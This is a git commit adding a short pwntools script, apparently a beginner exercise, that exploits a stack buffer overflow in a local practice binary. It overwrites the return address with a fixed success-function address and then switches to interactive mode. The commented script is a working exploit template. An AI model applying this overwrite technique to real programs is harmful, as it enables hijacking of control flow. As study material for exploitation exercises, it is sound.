e9c2a266737046e8cd4186d6296088d63a1b84b2
tangjiaping <tjp@qq.com>
2023-04-15 10:51:57 +0800

    finish basic stack overflow

---
+++ basic_example/test.py
@@ -0,0 +1,22 @@
+
+
+##coding=utf8
+from pwn import *
+## 构造与程序交互的对象
+
+def main():
+    sh = process('./basic')
+    success_addr = 0x080491B6
+
+    print (p32(success_addr))
+    ## 构造payload
+    payload = 'a' * 0x14 + 'bbbb' + p32(success_addr).decode('unicode_escape')
+
+    ## 向程序发送字符串
+    sh.sendline(payload)
+
+    ## 将代码交互转换为手工交互
+    sh.interactive()
+
+if __name__ == "__main__":
+    main()
